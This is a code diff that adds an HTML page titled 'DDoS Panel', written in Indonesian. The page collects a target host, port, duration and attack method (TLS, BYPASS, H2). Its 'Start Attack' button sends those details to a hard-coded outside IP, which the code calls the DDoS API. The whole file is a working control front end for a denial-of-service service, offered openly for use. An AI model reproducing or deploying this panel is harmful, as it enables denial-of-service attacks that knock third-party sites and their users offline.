@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DDoS Panel</title>
+    <style>
+        body {
+            background-color: #121212;
+            color: #fff;
+            font-family: monospace;
+            text-align: center;
+            padding: 20px;
+        }
+        h1 {
+            color: red;
+            text-shadow: 0 0 10px red;
+        }
+        input, select, button {
+            margin: 10px;
+            padding: 10px;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+        }
+        input, select {
+            background-color: #222;
+            color: white;
+        }
+        button {
+            background-color: red;
+            color: white;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        button:hover {
+            background-color: darkred;
+        }
+        #log {
+            margin-top: 20px;
+            padding: 10px;
+            background-color: #222;
+            text-align: left;
+            height: 100px;
+            overflow-y: auto;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>DDoS Panel</h1>
+    <input type="text" id="host" placeholder="Masukkan Host (IP/Domain)">
+    <input type="number" id="port" placeholder="Port (80, 443, dll.)">
+    <input type="number" id="time" placeholder="Durasi Serangan (detik)">
+    <select id="method">
+        <option value="tls">TLS</option>
+        <option value="bypass">BYPASS</option>
+        <option value="h2">H2</option>
+    </select>
+    <button onclick="startAttack()">Start Attack</button>
+
+    <div id="log">Log serangan akan muncul di sini...</div>
+
+    <script>
+        function startAttack() {
+            let host = document.getElementById("host").value;
+            let port = document.getElementById("port").value;
+            let time = document.getElementById("time").value;
+            let method = document.getElementById("method").value.toUpperCase(); // Ubah jadi huruf besar
+            let log = document.getElementById("log");
+
+            if (!host || !port || !time) {
+                log.innerHTML = "⚠️ Harap isi semua kolom!";
+                return;
+            }
+
+            log.innerHTML = `🚀 Menyerang <b>${host}:${port}</b> dengan metode <b>${method}</b> selama <b>${time}</b> detik...`;
+
+            // Kirim request ke API DDoS
+            fetch("http://64.227.139.46:4877/", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ host, port, time, method })
+            })
+            .then(response => response.json())
+            .then(data => log.innerHTML += `<br>✅ Serangan dikirim: ${JSON.stringify(data)}`)
+            .catch(error => log.innerHTML += `<br>❌ Error: ${error}`);
+        }
+    </script>
+
+</body>
+  </html>
